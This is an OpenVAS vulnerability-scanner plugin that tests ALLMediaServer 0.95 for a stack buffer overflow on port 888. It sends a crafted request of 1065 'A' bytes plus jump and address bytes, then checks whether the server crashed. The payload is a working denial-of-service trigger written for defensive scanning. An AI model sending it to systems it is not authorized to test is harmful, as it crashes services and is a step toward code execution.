##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_allmediaserver_stack_bof_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# ALLMediaServer Request Handling Stack Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

if(description)
{
  script_id(803745);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-08-22 10:39:02 +0530 (Thu, 22 Aug 2013)");
  script_name("ALLMediaServer Request Handling Stack Buffer Overflow Vulnerability");

  tag_summary =
"The host is running ALLMediaServer and is prone to stack based buffer overflow
vulnerability.";

  tag_vuldetect =
"Send the crafted HTTP GET request and check the server crashed or not.";

  tag_insight =
"The flaw is due to a boundary error when processing certain network requests
and can be exploited to cause a stack based buffer overflow via a specially
crafted packet sent to TCP port 888.";

  tag_impact =
"Successful exploitation will allow attackers to execute arbitrary code in
the context of the application. Failed attacks will cause denial of service
conditions.";

  tag_affected =
"ALLMediaServer version 0.95 and prior.";

  tag_solution =
"No solution or patch is available as of 22nd August, 2013. Information
regarding this issue will be updated once the solution details are available.
For updates refer to http://allmediaserver.org";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122912");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122913");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/allmediaserver-095-buffer-overflow");
  script_summary("Determine if ALLMediaServer Server is prone to a buffer overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 888);
  exit(0);
}


include("http_func.inc");

## Variable Initialization
soc = 0;
port = 0;
req = "";
banner = "";

## Get ALLMediaServer Port
port = get_http_port(default:888);
if(! port){
  port = 888;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm ALLMediaServeris running
if(http_is_dead(port:port)){
  exit(0);
}

## Open HTTP Socket
soc = http_open_socket(port);
if(!soc) {
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Server: ALLPLAYER-DLNA" >!< banner)
{
  http_close_socket(soc);
  exit(0);
}

## Construct and Send attack Request
req = crap(data: "A", length: 1065) + "\xEB\x06\xFF\xFF" + "\x54\x08\x6f\x00";

send(socket:soc, data:req);
http_close_socket(soc);

sleep(3);

## Confirm ALLMediaServer is dead
if(http_is_dead(port:port))
{
  security_hole(port);
  exit(0);
}
